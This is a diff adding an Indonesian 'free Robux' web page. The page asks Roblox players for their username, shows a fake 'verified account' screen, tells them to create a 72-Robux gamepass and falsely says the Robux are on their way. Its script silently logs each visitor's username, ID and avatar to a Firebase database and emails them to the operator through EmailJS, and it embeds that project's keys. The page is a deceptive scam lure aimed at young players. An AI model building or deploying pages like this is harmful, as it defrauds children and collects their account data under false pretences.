@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Robux Gratis</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCsMXNyb8EDDEymYc-dtC9eZx8qorgmyV8",
+    authDomain: "robux-gratis-id.firebaseapp.com",
+    projectId: "robux-gratis-id",
+    storageBucket: "robux-gratis-id.firebasestorage.app",
+    messagingSenderId: "390349916559",
+    appId: "1:390349916559:web:b03289e638a0f46fcda3fa"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  window._saveKlaim = async function(username, userId, avatarUrl) {
+    try {
+      await addDoc(collection(db, "klaim"), {
+        username,
+        userId,
+        avatarUrl,
+        timestamp: serverTimestamp(),
+        tanggal: new Date().toLocaleString('id-ID')
+      });
+    } catch(e) {
+      console.warn("Firestore error:", e);
+    }
+  };
+</script>
+<style>
+  :root {
+    --red: #ff4757; --orange: #ff9f43; --green: #2ed573;
+    --bg: #f0f4ff; --white: #ffffff; --text: #2f3542;
+    --muted: #747d8c; --border: #e2e8f8;
+    --shadow: 0 4px 24px rgba(100,120,200,0.10);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Nunito', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
+  body::before {
+    content: ''; position: fixed; inset: 0;
+    background: radial-gradient(circle at 10% 10%, rgba(255,71,87,0.10) 0%, transparent 40%),
+                radial-gradient(circle at 90% 5%, rgba(30,144,255,0.10) 0%, transparent 35%),
+                radial-gradient(circle at 50% 90%, rgba(255,165,2,0.08) 0%, transparent 40%);
+    pointer-events: none; z-index: 0;
+  }
+  .bubble { position: fixed; border-radius: 50%; opacity: 0; animation: rise linear infinite; pointer-events: none; z-index: 0; }
+  @keyframes rise { 0% { transform: translateY(110vh); opacity: 0; } 10% { opacity: 0.15; } 90% { opacity: 0.15; } 100% { transform: translateY(-10vh); opacity: 0; } }
+  .wrap { max-width: 520px; margin: 0 auto; padding: 0 16px 60px; position: relative; z-index: 1; }
+  header { text-align: center; padding: 44px 0 24px; }
+  .logo-box { display: inline-flex; align-items: center; justify-content: center; width: 76px; height: 76px; background: linear-gradient(135deg, #ff4757, #ff9f43); border-radius: 24px; font-size: 38px; box-shadow: 0 8px 28px rgba(255,71,87,0.32); margin-bottom: 16px; animation: logoFloat 3s ease-in-out infinite; }
+  @keyframes logoFloat { 0%,100% { transform: translateY(0) rotate(-3deg); } 50% { transform: translateY(-8px) rotate(3deg); } }
+  header h1 { font-size: clamp(2rem, 7vw, 3rem); font-weight: 900; color: var(--text); letter-spacing: -1px; }
+  header h1 span { color: var(--red); }
+  header p { font-size: 14px; color: var(--muted); margin-top: 6px; font-weight: 600; }
+  .chip-green { display: inline-flex; align-items: center; gap: 5px; background: #eafff4; border: 1.5px solid #b7f5d4; color: #0d8a4e; font-size: 12px; font-weight: 800; padding: 5px 14px; border-radius: 50px; margin-top: 12px; }
+  .steps { display: flex; align-items: center; justify-content: center; margin: 26px auto 0; max-width: 360px; }
+  .s-dot { width: 36px; height: 36px; border-radius: 50%; background: var(--white); border: 2px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 800; color: var(--muted); flex-shrink: 0; transition: all .4s; box-shadow: 0 2px 10px rgba(0,0,0,0.06); }
+  .s-dot.active { background: var(--red); border-color: var(--red); color: white; box-shadow: 0 4px 14px rgba(255,71,87,0.35); }
+  .s-dot.done { background: var(--green); border-color: var(--green); color: white; }
+  .s-line { flex: 1; height: 3px; background: var(--border); border-radius: 10px; transition: background .4s; }
+  .s-line.done { background: var(--green); }
+  .card { background: var(--white); border: 1.5px solid var(--border); border-radius: 24px; padding: 28px 24px; margin: 20px 0; box-shadow: var(--shadow); animation: popUp .45s cubic-bezier(.34,1.56,.64,1) both; }
+  @keyframes popUp { from { opacity: 0; transform: translateY(24px) scale(.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
+  .c-title { font-size: 1.15rem; font-weight: 800; color: var(--text); margin-bottom: 4px; display: flex; align-items: center; gap: 8px; }
+  .c-sub { font-size: 13px; color: var(--muted); margin-bottom: 22px; font-weight: 600; }
+  .rbx-hero { background: linear-gradient(135deg, #fff5f5, #fff8ed); border: 1.5px solid #ffd6d6; border-radius: 18px; padding: 22px; display: flex; align-items: center; justify-content: center; gap: 18px; margin-bottom: 20px; }
+  .rbx-coin { font-size: 52px; animation: flip 4s ease-in-out infinite; }
+  @keyframes flip { 0%,100% { transform: rotateY(0deg); } 50% { transform: rotateY(180deg); } }
+  .rbx-num { font-size: 3.2rem; font-weight: 900; color: var(--red); line-height: 1; letter-spacing: -2px; }
+  .rbx-lbl { font-size: 12px; color: var(--muted); font-weight: 700; margin-top: 2px; text-transform: uppercase; letter-spacing: 1px; }
+  .field { margin-bottom: 16px; }
+  .field label { display: block; font-size: 13px; font-weight: 800; color: var(--text); margin-bottom: 7px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .field input { width: 100%; padding: 14px 16px; background: var(--bg); border: 2px solid var(--border); border-radius: 14px; color: var(--text); font-family: 'Nunito', sans-serif; font-size: 16px; font-weight: 700; outline: none; transition: border-color .2s, box-shadow .2s; }
+  .field input:focus { border-color: var(--red); box-shadow: 0 0 0 3px rgba(255,71,87,0.12); background: var(--white); }
+  .field input::placeholder { color: #c5cde8; font-weight: 600; }
+  .field input.err { border-color: var(--red); animation: shake .35s ease; }
+  @keyframes shake { 0%,100% { transform: translateX(0); } 25%,75% { transform: translateX(-6px); } 50% { transform: translateX(6px); } }
+  .err-msg { font-size: 12px; font-weight: 700; color: var(--red); margin-top: 5px; display: none; }
+  .err-msg.show { display: block; }
+  .btn { width: 100%; padding: 15px; border: none; border-radius: 14px; font-family: 'Nunito', sans-serif; font-size: 16px; font-weight: 800; cursor: pointer; transition: transform .18s, box-shadow .18s, opacity .2s; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .btn:hover { transform: translateY(-2px); }
+  .btn:active { transform: translateY(0); }
+  .btn:disabled { opacity: .55; cursor: not-allowed; transform: none !important; }
+  .btn-red { background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; box-shadow: 0 6px 20px rgba(255,71,87,0.35); }
+  .btn-red:hover { box-shadow: 0 8px 28px rgba(255,71,87,0.48); }
+  .btn-green { background: linear-gradient(135deg, #2ed573, #1abc6e); color: white; box-shadow: 0 6px 20px rgba(46,213,115,0.35); }
+  .btn-ghost { background: var(--bg); color: var(--muted); border: 2px solid var(--border); box-shadow: none; margin-top: 8px; font-weight: 700; }
+  .alert { display: flex; gap: 10px; padding: 13px 15px; border-radius: 14px; margin: 12px 0; font-size: 13px; font-weight: 700; line-height: 1.55; }
+  .a-info { background: #eaf4ff; border: 1.5px solid #b3d9ff; color: #0a5a9e; }
+  .a-ok { background: #eafff4; border: 1.5px solid #b7f5d4; color: #0d7a46; }
+  .a-warn { background: #fff8e6; border: 1.5px solid #ffd88a; color: #925200; }
+  .avatar-card { display: flex; align-items: center; gap: 16px; background: var(--bg); border: 2px solid var(--border); border-radius: 18px; padding: 16px 18px; margin: 16px 0; }
+  .avatar-img { width: 64px; height: 64px; min-width: 64px; border-radius: 16px; border: 3px solid var(--red); object-fit: cover; box-shadow: 0 4px 14px rgba(255,71,87,0.25); background: #f0f4ff; }
+  .avatar-skeleton { width: 64px; height: 64px; min-width: 64px; border-radius: 16px; background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
+  @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+  .u-name { font-size: 17px; font-weight: 900; color: var(--text); }
+  .u-sub { font-size: 12px; color: var(--muted); margin-top: 3px; font-weight: 600; }
+  .u-id { font-size: 11px; color: var(--muted); margin-top: 2px; font-weight: 600; }
+  .info-box { background: var(--bg); border: 2px solid var(--border); border-radius: 16px; padding: 18px; margin: 14px 0; text-align: center; }
+  .info-box .big { font-size: 2.5rem; font-weight: 900; color: var(--red); letter-spacing: -1px; }
+  .info-box .lbl { font-size: 12px; color: var(--muted); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+  .win-wrap { text-align: center; padding: 8px 0 16px; }
+  .confetti { font-size: 26px; letter-spacing: 5px; animation: bob 2s ease-in-out infinite; }
+  @keyframes bob { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-7px); } }
+  .trophy { font-size: 80px; animation: tIn .6s cubic-bezier(.34,1.56,.64,1) both; }
+  @keyframes tIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .win-amount { background: linear-gradient(135deg, #fff5f5, #fff8ed); border: 2px solid #ffd6d6; border-radius: 18px; padding: 22px; margin: 14px 0; text-align: center; }
+  .win-rbx { font-size: 3.5rem; font-weight: 900; color: var(--red); letter-spacing: -2px; }
+  .hidden { display: none !important; }
+  footer { text-align: center; padding: 28px 0 10px; font-size: 12px; color: var(--muted); font-weight: 600; }
+  footer a { color: var(--red); text-decoration: none; font-weight: 800; }
+</style>
+</head>
+<body>
+<script>
+  emailjs.init("i63TMFLxk7CxJLfee");
+  const cols = ['#ffb3ba','#ffd6a5','#b5ead7','#c7ceea','#ffc8dd'];
+  for (let i = 0; i < 18; i++) {
+    const b = document.createElement('div');
+    b.className = 'bubble';
+    const s = Math.random() * 20 + 8;
+    b.style.cssText = `width:${s}px;height:${s}px;left:${Math.random()*100}vw;background:${cols[Math.floor(Math.random()*cols.length)]};animation-duration:${14+Math.random()*18}s;animation-delay:${Math.random()*14}s;`;
+    document.body.appendChild(b);
+  }
+</script>
+
+<div class="wrap">
+  <header>
+    <div class="logo-box">🎮</div>
+    <h1>Robux <span>Gratis!</span></h1>
+    <p>Dapatkan 72 Robux secara gratis</p>
+    <div class="chip-green">✅ Verifikasi Akun Roblox Asli</div>
+    <div class="steps">
+      <div class="s-dot active" id="d1">1</div>
+      <div class="s-line" id="l1"></div>
+      <div class="s-dot" id="d2">2</div>
+      <div class="s-line" id="l2"></div>
+      <div class="s-dot" id="d3">✓</div>
+    </div>
+  </header>
+
+  <!-- STEP 1 -->
+  <div id="s1" class="card">
+    <div class="c-title">👤 Masukkan Username Roblox</div>
+    <div class="c-sub">Username kamu akan dicek langsung ke server Roblox</div>
+    <div class="rbx-hero">
+      <div class="rbx-coin">💎</div>
+      <div>
+        <div class="rbx-num">72</div>
+        <div class="rbx-lbl">Robux Gratis</div>
+      </div>
+    </div>
+    <div class="alert a-info">
+      <span>ℹ️</span>
+      <span>Sistem ini menggunakan <strong>Roblox API resmi</strong> untuk memverifikasi akun kamu secara langsung.</span>
+    </div>
+    <div class="field">
+      <label for="uInput">Username Roblox</label>
+      <input type="text" id="uInput" placeholder="Contoh: Builderman" maxlength="20" />
+      <div class="err-msg" id="uErr">⚠️ Masukkan username Roblox kamu!</div>
+    </div>
+    <button class="btn btn-red" id="s1Btn" onclick="step1Next()">🚀 Klaim Robux Sekarang</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="s2" class="card hidden">
+    <div class="c-title">📋 Langkah 2 — Buat Gamepass</div>
+    <div class="c-sub">Ikuti langkah berikut untuk mendapatkan Robux kamu</div>
+    <div class="avatar-card" id="avatarCard">
+      <div class="avatar-skeleton" id="avatarSkeleton"></div>
+      <div>
+        <div class="u-name" id="showUser">—</div>
+        <div class="u-sub">✅ Akun Roblox Terverifikasi</div>
+        <div class="u-id" id="showUserId">ID: —</div>
+      </div>
+    </div>
+    <div class="info-box">
+      <div class="big">72 💎</div>
+      <div class="lbl">Robux yang akan kamu terima</div>
+    </div>
+    <div class="alert a-warn">
+      <span>⚡</span>
+      <span>Buat Gamepass di game kamu dengan harga tepat <strong>72 Robux</strong>, lalu klik tombol di bawah setelah selesai!</span>
+    </div>
+    <div class="alert a-info">
+      <span>📖</span>
+      <span>Cara buat Gamepass: Buka <strong>create.roblox.com</strong> → pilih game → Monetization → Passes → Create → set harga <strong>72 Robux</strong></span>
+    </div>
+    <button class="btn btn-green" onclick="step2Next()">✅ Sudah Buat Gamepass! Klaim Robux →</button>
+    <button class="btn btn-ghost" onclick="back1()">← Kembali</button>
+  </div>
+
+  <!-- STEP 3 SUCCESS -->
+  <div id="s3" class="card hidden">
+    <div class="win-wrap">
+      <div class="confetti">🎊🎉🎊🎉🎊</div>
+      <div class="trophy">🏆</div>
+      <div class="confetti">🎉🎊🎉🎊🎉</div>
+    </div>
+    <h2 style="text-align:center;font-size:1.7rem;font-weight:900;color:var(--text);margin:10px 0 4px">Selamat! 🎉</h2>
+    <p style="text-align:center;color:var(--muted);font-size:13px;margin-bottom:18px;font-weight:700">Akun kamu sudah terverifikasi!</p>
+    <div class="avatar-card">
+      <img class="avatar-img" id="winAvatar" src="" alt="avatar" />
+      <div>
+        <div class="u-name" id="winUser">—</div>
+        <div class="u-sub">✅ Akun Terverifikasi</div>
+        <div class="u-id" id="winId">—</div>
+      </div>
+    </div>
+    <div class="win-amount">
+      <div style="font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:800;text-transform:uppercase;letter-spacing:1px">Robux Sedang Dikirim</div>
+      <div class="win-rbx">💎 72</div>
+      <div style="font-size:13px;color:var(--muted);margin-top:5px;font-weight:700">Masuk dalam 1×24 jam</div>
+    </div>
+    <div class="alert a-ok">
+      <span>💡</span>
+      <span><strong>Cara kerja:</strong> Setiap pemain yang beli Gamepass 72 Robux di game kamu → Robux langsung masuk ke akunmu!</span>
+    </div>
+    <button class="btn btn-red" onclick="resetAll()">🔄 Mulai Ulang</button>
+  </div>
+</div>
+
+<footer>
+  <p>Menggunakan Roblox Public API — Bukan afiliasi resmi Roblox Corporation</p>
+  <p style="margin-top:4px"><a href="https://create.roblox.com" target="_blank">create.roblox.com</a> · <a href="https://roblox.com" target="_blank">roblox.com</a></p>
+</footer>
+
+<script>
+  let state = { username: '', userId: null, avatarUrl: '' };
+
+  function setSteps(cur) {
+    for (let i = 1; i <= 3; i++) {
+      const d = document.getElementById('d' + i);
+      if (!d) continue;
+      d.className = 's-dot';
+      if (i < cur) d.classList.add('done');
+      else if (i === cur) d.classList.add('active');
+    }
+    for (let i = 1; i <= 2; i++) {
+      const l = document.getElementById('l' + i);
+      if (!l) continue;
+      l.className = 's-line';
+      if (i < cur) l.classList.add('done');
+    }
+  }
+
+  function show(id) {
+    ['s1','s2','s3'].forEach(s => document.getElementById(s).classList.add('hidden'));
+    document.getElementById(id).classList.remove('hidden');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  async function getAvatar(userId) {
+    try {
+      const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+      const data = await res.json();
+      if (data.data && data.data[0]) return data.data[0].imageUrl;
+    } catch(e) {}
+    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+  }
+
+  async function step1Next() {
+    const inp = document.getElementById('uInput');
+    const val = inp.value.trim();
+    const errEl = document.getElementById('uErr');
+    if (!val) {
+      inp.classList.add('err');
+      errEl.classList.add('show');
+      setTimeout(() => inp.classList.remove('err'), 400);
+      return;
+    }
+    errEl.classList.remove('show');
+    const btn = document.getElementById('s1Btn');
+    btn.disabled = true;
+    btn.innerHTML = '⏳ Mengecek username...';
+    try {
+      const res = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(val)}`);
+      const data = await res.json();
+      if (data.errorMessage || !data.Id) {
+        inp.classList.add('err');
+        errEl.textContent = `❌ Username "${val}" tidak ditemukan di Roblox!`;
+        errEl.classList.add('show');
+        setTimeout(() => inp.classList.remove('err'), 400);
+        btn.disabled = false;
+        btn.innerHTML = '🚀 Klaim Robux Sekarang';
+        return;
+      }
+      const user = { name: data.Username, id: data.Id };
+      state.username = user.name;
+      state.userId = user.id;
+      document.getElementById('showUser').textContent = user.name;
+      document.getElementById('showUserId').textContent = `ID: ${user.id}`;
+      const avatarUrl = await getAvatar(user.id);
+      state.avatarUrl = avatarUrl;
+      const skeleton = document.getElementById('avatarSkeleton');
+      if (skeleton) {
+        const img = document.createElement('img');
+        img.className = 'avatar-img';
+        img.src = avatarUrl;
+        img.alt = user.name;
+        skeleton.parentNode.replaceChild(img, skeleton);
+      }
+      btn.disabled = false;
+      btn.innerHTML = '🚀 Klaim Robux Sekarang';
+      show('s2');
+      setSteps(2);
+    } catch(e) {
+      errEl.textContent = '❌ Gagal menghubungi server Roblox. Coba lagi!';
+      errEl.classList.add('show');
+      btn.disabled = false;
+      btn.innerHTML = '🚀 Klaim Robux Sekarang';
+    }
+  }
+
+  async function step2Next() {
+    document.getElementById('winUser').textContent = state.username;
+    document.getElementById('winId').textContent = `ID: ${state.userId}`;
+    document.getElementById('winAvatar').src = state.avatarUrl;
+
+    // Simpan ke Firebase
+    if (window._saveKlaim) {
+      await window._saveKlaim(state.username, state.userId, state.avatarUrl);
+    }
+
+    // Kirim EmailJS
+    try {
+      const now = new Date();
+      const timeStr = now.toLocaleString('id-ID', { day:'2-digit', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit' });
+      await emailjs.send("service_08rnzpt", "template_9d4kbg8", {
+        username: state.username, gamepassName: 'Belum diverifikasi',
+        gamepassId: '-', price: '72', time: timeStr,
+      });
+    } catch(e) { console.warn('EmailJS gagal:', e); }
+
+    show('s3');
+    setSteps(3);
+  }
+
+  function back1() { show('s1'); setSteps(1); }
+
+  function resetAll() {
+    state = { username: '', userId: null, avatarUrl: '' };
+    document.getElementById('uInput').value = '';
+    document.getElementById('uErr').classList.remove('show');
+    document.getElementById('s1Btn').innerHTML = '🚀 Klaim Robux Sekarang';
+    document.getElementById('s1Btn').disabled = false;
+    const avatarCard = document.getElementById('avatarCard');
+    const oldImg = avatarCard ? avatarCard.querySelector('img') : null;
+    if (oldImg) {
+      const skeleton = document.createElement('div');
+      skeleton.className = 'avatar-skeleton';
+      skeleton.id = 'avatarSkeleton';
+      avatarCard.replaceChild(skeleton, oldImg);
+    }
+    show('s1'); setSteps(1);
+  }
+</script>
+</body>
+  </html>
+  
